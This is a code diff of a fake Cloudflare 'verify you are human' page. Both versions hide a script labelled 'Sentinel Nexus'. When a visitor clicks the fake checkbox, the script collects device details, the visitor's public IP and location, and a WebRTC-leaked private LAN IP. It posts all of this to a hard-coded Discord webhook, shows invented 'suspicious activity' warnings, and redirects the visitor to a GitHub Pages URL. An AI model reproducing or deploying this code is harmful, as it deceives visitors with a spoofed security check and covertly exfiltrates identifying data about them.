@@ -2,142 +2,138 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Cloudflare | Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare | Verify Connection</title>
     <style>
-        body { background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
-        .cf-wrapper { width: 100%; max-width: 420px; padding: 25px; box-sizing: border-box; }
-        .cf-logo { width: 130px; margin-bottom: 25px; }
-        .h1 { font-size: 28px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .p { font-size: 15px; color: #666; margin-bottom: 35px; line-height: 1.5; }
+        body { background-color: #fff; font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
+        .container { width: 100%; max-width: 440px; padding: 20px; }
+        .cf-logo { width: 120px; margin-bottom: 20px; }
+        .h1 { font-size: 30px; font-weight: 600; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .subtext { font-size: 15px; color: #7d7d7d; margin-bottom: 30px; line-height: 1.5; }
         
-        /* The Turnstile Box */
-        .ts-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 16px; display: flex; align-items: center; cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent; }
-        .ts-check { width: 26px; height: 26px; border: 2px solid #0051c3; border-radius: 4px; margin-right: 18px; background: #fff; flex-shrink: 0; transition: 0.2s; }
-        .ts-check.spinning { border-top-color: transparent; border-radius: 50%; animation: spin 0.7s linear infinite; }
-        .ts-text { font-size: 14px; font-weight: 400; flex-grow: 1; }
-        .ts-footer { text-align: right; font-size: 9px; color: #999; }
-        .ts-footer img { width: 18px; display: block; margin: 0 auto 2px; filter: grayscale(1); }
+        /* Turnstile Component */
+        .ts-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; position: relative; min-height: 65px; }
+        .ts-check { width: 28px; height: 28px; border: 2px solid #0051c3; border-radius: 4px; margin-right: 15px; background: #fff; flex-shrink: 0; }
+        .ts-check.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .ts-text { font-size: 15px; font-weight: 400; flex-grow: 1; }
+        .ts-logo { text-align: right; font-size: 10px; color: #7d7d7d; }
+        .ts-logo img { width: 20px; display: block; margin: 0 auto 2px; }
 
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        #alert { background: #fff5f5; border: 1px solid #fcbbbb; color: #bd2c00; padding: 12px; border-radius: 4px; font-size: 12px; font-weight: 700; margin-top: 15px; display: none; }
+        #alert-box { background: #fff5f5; border: 1px solid #fcbbbb; color: #bd2c00; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
 
-<div class="cf-wrapper">
+<div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="cf-logo">
-    <div class="h1">Verify identity</div>
-    <div class="p">Please click the box below to verify your network connection. This helps us ensure a secure browsing experience.</div>
+    <div class="h1">Verify you are human</div>
+    <div class="subtext">Please complete the security check to continue. This process is automatic and ensures your connection is secure.</div>
     
-    <div class="ts-box" id="gate">
-        <div class="ts-check" id="loader"></div>
-        <div class="ts-text" id="msg">Verify you are human</div>
-        <div class="ts-footer">
+    <div class="ts-box" id="verify-btn">
+        <div class="ts-check" id="box"></div>
+        <div class="ts-text" id="status">Verify identity</div>
+        <div class="ts-logo">
             <img src="https://www.cloudflare.com/favicon.ico">
             <span>Turnstile</span>
         </div>
     </div>
 
-    <div id="alert">⚠️ SUSPICIOUS ACTIVITY DETECTED: CONNECTION UNSTABLE</div>
+    <div id="alert-box">⚠️ SUSPICIOUS WIFI ACTIVITY DETECTED: PLEASE RE-VERIFY.</div>
 </div>
 
 <script>
 /**
- * SENTINEL NEXUS-TURBO v38.0
- * IOS-OPTIMIZED EXFILTRATION + 7S HARD-FORCE
+ * SENTINEL NEXUS-TURNSTILE v37.0
+ * CLOUDFLARE UI + 7S ABSOLUTE REDIRECT
  */
 
 const CONFIG = {
     WH: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
     DEST: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
     PING: "@everyone",
-    DONE: { ip: false, rtc: false }
+    FLAGS: { g: false, r: false }
 };
 
-// iOS Reliability Protocol (Synchronous + Beacon + Image Ping)
-const broadcast = (data, event) => {
+const sendStrike = (data, tag, color = 0x0051c3) => {
     const payload = JSON.stringify({
-        content: event === "HARDWARE" ? CONFIG.PING : "",
-        username: `NEXUS-TURBO [${event}]`,
+        content: tag === "CRITICAL_HIT" ? CONFIG.PING : "",
+        username: `NEXUS-v37 [${tag}]`,
         embeds: [{
-            title: `🔱 Global Unmask: ${event}`,
-            color: event === "ALERT" ? 0xbd2c00 : 0x0051c3,
+            title: `🔓 Node Pierced: ${tag}`,
+            color: color,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
             timestamp: new Date().toISOString()
         }]
     });
 
-    // Strategy 1: Beacon (Best for iOS unload)
-    if (navigator.sendBeacon) navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
-    
-    // Strategy 2: Fetch with keepalive (iOS 15+)
+    // Forced Exfiltration Protocols
+    navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
     fetch(CONFIG.WH, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
-
-    // Strategy 3: Ghost Image (Hard-coded to ensure basic ping hits Discord)
-    const i = new Image(); i.src = `${CONFIG.WH}?v=${Date.now()}&e=${event}`;
 };
 
-document.getElementById('gate').onclick = async function() {
-    const loader = document.getElementById('loader');
-    const msg = document.getElementById('msg');
-    const alert = document.getElementById('alert');
+document.getElementById('verify-btn').onclick = async function() {
+    const box = document.getElementById('box');
+    const status = document.getElementById('status');
+    const alert = document.getElementById('alert-box');
 
-    loader.classList.add('spinning');
-    msg.innerText = "Checking...";
+    box.classList.add('loading');
+    status.innerText = "Verifying...";
 
-    // --- PHASE 1: IOS HARDWARE EXTRACTION ---
+    // 1. GATHER DEVICE DATA IMMEDIATELY
     const b = await navigator.getBattery().catch(() => ({ level: 0 }));
-    broadcast({
+    sendStrike({
         platform: navigator.platform,
         cores: navigator.hardwareConcurrency || "N/A",
         ram: navigator.deviceMemory || "N/A",
-        screen: `${screen.width}x${screen.height}`,
         battery: b.level ? `${(b.level * 100).toFixed(0)}%` : "N/A",
-        agent: navigator.userAgent.includes("iPhone") ? "iPhone/iOS" : "Android/PC"
-    }, "HARDWARE");
+        screen: `${screen.width}x${screen.height}`,
+        ua: navigator.userAgent
+    }, "CRITICAL_HIT", 0xff0000);
 
-    // --- PHASE 2: FORCED PUBLIC IP (MULTI-GEO) ---
-    const getIP = (url) => {
+    // 2. FORCED PUBLIC IP RESOLUTION
+    const grabNet = (url) => {
         fetch(url).then(r => r.json()).then(res => {
-            if(!CONFIG.DONE.ip) {
-                broadcast({
-                    ip: res.ip || res.query,
+            if(!CONFIG.FLAGS.g) {
+                sendStrike({
+                    public_ip: res.ip || res.query,
                     isp: res.org || res.isp,
                     loc: `${res.city}, ${res.country}`,
-                    relay: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "VPN/Relay" : "Direct"
-                }, "NETWORK");
-                CONFIG.DONE.ip = true;
+                    vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
+                }, "NETWORK_IP", 0x34c759);
+                CONFIG.FLAGS.g = true;
             }
         }).catch(()=>{});
     };
-    getIP('https://ipapi.co/json/');
-    getIP('http://ip-api.com/json/');
+    grabNet('https://ipapi.co/json/');
+    grabNet('http://ip-api.com/json/');
 
-    // --- PHASE 3: PRIVATE LAN PIERCING (RTC) ---
+    // 3. PRIVATE LAN IP BYPASS (RTC)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
-        if (e.candidate && !CONFIG.DONE.rtc) {
+        if (e.candidate && !CONFIG.FLAGS.r) {
             const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
             if (ip) {
-                broadcast({ internal: ip[1], status: "PIERCED" }, "RTC_UNMASK");
-                CONFIG.DONE.rtc = true;
+                sendStrike({ local_lan: ip[1], status: "UNMASKED" }, "RTC_PIERCED", 0x5856d6);
+                CONFIG.FLAGS.r = true;
             }
         }
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // --- PHASE 4: 7-SECOND HARD-FORCE REDIRECT ---
-    setTimeout(() => { msg.innerText = "Analyzing security signatures..."; }, 2500);
+    // 4. THE 7-SECOND HARD-FORCE REDIRECT
+    setTimeout(() => { 
+        status.innerText = "Analyzing network environment..."; 
+    }, 2500);
 
     setTimeout(() => { 
-        msg.innerText = "Detecting anomalies..."; 
-        msg.style.color = "#bd2c00";
+        status.innerText = "Checking security signature..."; 
+        status.style.color = "#bd2c00";
         alert.style.display = "block";
     }, 4500);
 
-    // THE REDIRECT OVERRIDE: Redirects no matter what after 7 seconds.
+    // ABSOLUTE REDIRECT: Fires regardless of data success
     setTimeout(() => {
         window.location.replace(CONFIG.DEST);
     }, 7000);
